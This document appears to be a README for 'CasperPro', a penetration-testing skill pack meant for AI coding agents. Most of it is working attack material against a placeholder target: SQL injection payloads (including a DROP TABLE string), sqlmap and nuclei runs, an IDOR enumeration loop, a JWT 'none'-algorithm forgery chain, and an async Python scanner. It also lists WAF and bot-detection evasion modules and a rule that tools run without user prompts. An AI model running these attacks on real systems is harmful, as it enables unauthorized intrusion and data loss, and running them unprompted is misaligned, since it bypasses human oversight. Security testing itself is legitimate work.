# CasperPro v2.3

Enterprise-grade penetration testing framework for OpenCode agents. A complete Burp Suite alternative using open-source CLI tools.

## Stack

```
curl + mitmproxy + playwright + uv + python
```

## Quick Start

### 1. Install Dependencies

```bash
# macOS
brew install mitmproxy jq

# Install Python tools with uv
uv tool install mitmproxy
uv add playwright httpx aiohttp

# Install Playwright browsers
uv run playwright install chromium
```

### 2. Start Traffic Interception

```bash
# Terminal 1: Start mitmproxy
mitmproxy --mode regular --listen-port 8080 --set console_eventlog_verbosity=info

# Terminal 2: Proxy curl requests
curl -x http://127.0.0.1:8080 -k https://target.com/api/users
```

### 3. Basic API Testing

```bash
# Authentication test
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}' | jq

# SQLi probe
curl -s "https://target.com/api/users?id=1'" | jq

# IDOR test
curl -s -H "Authorization: Bearer $TOKEN" \
  https://target.com/api/users/2 | jq
```

## Module Reference

| Module | Description |
|--------|-------------|
| `SKILL.md` | Main skill definition and core patterns |
| `casperpro-discovery.md` | Traffic interception, API discovery |
| `casperpro-authentication.md` | JWT, OAuth, session testing |
| `casperpro-injection-advanced.md` | SSRF, deserialization, request smuggling |
| `casperpro-evasion.md` | WAF bypass, rate limiting, bot detection |
| `casperpro-api-advanced.md` | GraphQL, WebSocket, gRPC |
| `casperpro-business-logic.md` | Basic business logic testing |
| `casperpro-business-logic-advanced.md` | Financial, e-commerce, workflow, multi-tenant |
| `casperpro-edge-cases.md` | Type juggling, unicode, mass assignment, HPP, proto pollution |
| `casperpro-enterprise-tech.md` | LDAP, SAML, OAuth enterprise, MQ, webhooks |
| `casperpro-automation.md` | Python automation framework |
| `casperpro-reporting.md` | CVSS 3.1, compliance mapping |
| `casperpro-tools-integration.md` | nuclei, sqlmap, ffuf, interactsh |
| `casperpro-windows.md` | Windows/PowerShell implementation |

## Common Workflows

### Full Recon → Exploit Flow

```bash
# 1. Discover endpoints
ffuf -u https://target.com/FUZZ -w /opt/wordlists/api-endpoints.txt -o endpoints.json

# 2. Test authentication
curl -s -X POST https://target.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}' | jq

# 3. Fuzz parameters
ffuf -u "https://target.com/api/users?FUZZ=1" \
  -w /opt/wordlists/params.txt \
  -H "Authorization: Bearer $TOKEN"

# 4. Test for injection
sqlmap -u "https://target.com/api/users?id=1" \
  --headers="Authorization: Bearer $TOKEN" \
  --batch --level=3

# 5. Run nuclei templates
nuclei -u https://target.com -t cves/ -t exposures/ -o nuclei-results.txt
```

### IDOR Testing Chain

```bash
# Get own resource
curl -s -H "Authorization: Bearer $USER_TOKEN" \
  https://target.com/api/orders/100 | jq > own_order.json

# Test horizontal privilege escalation
for id in {101..110}; do
  resp=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Bearer $USER_TOKEN" \
    https://target.com/api/orders/$id)
  code=$(echo "$resp" | tail -1)
  [ "$code" = "200" ] && echo "IDOR: Order $id accessible"
done
```

### JWT Attack Chain

```bash
# Extract JWT
TOKEN="eyJhbGciOiJIUzI1NiIs..."

# Decode payload
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Test none algorithm
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=')
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
FORGED="${HEADER}.${PAYLOAD}."

curl -s -H "Authorization: Bearer $FORGED" \
  https://target.com/api/admin | jq
```

## Python Automation Example

```python
#!/usr/bin/env python3
"""CasperPro automated scanner - run with: uv run scanner.py"""

import httpx
import asyncio
from urllib.parse import urljoin

class CasperScanner:
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url
        self.headers = {"Authorization": f"Bearer {token}"} if token else {}
        
    async def test_idor(self, endpoint: str, id_range: range):
        """Test IDOR vulnerabilities"""
        async with httpx.AsyncClient(headers=self.headers) as client:
            tasks = [client.get(urljoin(self.base_url, f"{endpoint}/{i}")) 
                     for i in id_range]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            for i, resp in zip(id_range, responses):
                if isinstance(resp, httpx.Response) and resp.status_code == 200:
                    print(f"[VULN] IDOR at {endpoint}/{i}")
                    
    async def test_sqli(self, endpoint: str, param: str):
        """Test SQL injection"""
        payloads = ["'", "1 OR 1=1", "1' OR '1'='1", "1; DROP TABLE users--"]
        async with httpx.AsyncClient(headers=self.headers) as client:
            for payload in payloads:
                resp = await client.get(
                    urljoin(self.base_url, endpoint),
                    params={param: payload}
                )
                if any(err in resp.text.lower() for err in ['sql', 'syntax', 'mysql', 'postgresql']):
                    print(f"[VULN] SQLi at {endpoint}?{param}={payload}")

async def main():
    scanner = CasperScanner("https://target.com/api", token="your-token")
    await scanner.test_idor("/users", range(1, 20))
    await scanner.test_sqli("/search", "q")

if __name__ == "__main__":
    asyncio.run(main())
```

Run with:
```bash
uv run scanner.py
```

## Platform Support

| Platform | Shell | Status |
|----------|-------|--------|
| macOS | bash/zsh | Full support |
| Linux | bash | Full support |
| Windows | PowerShell | Full support (see casperpro-windows.md) |

## Requirements

- Python 3.11+ (managed by uv)
- mitmproxy 10+
- curl with HTTP/2 support
- jq for JSON parsing

## Strict Rules

1. **Always use `uv`** for Python package management (never pip)
2. **Non-interactive mode** - all tools must run without user prompts
3. **Proxy all traffic** through mitmproxy when intercepting
4. **Document findings** with CVSS 3.1 scores

## License

Internal use only. Enterprise penetration testing framework.
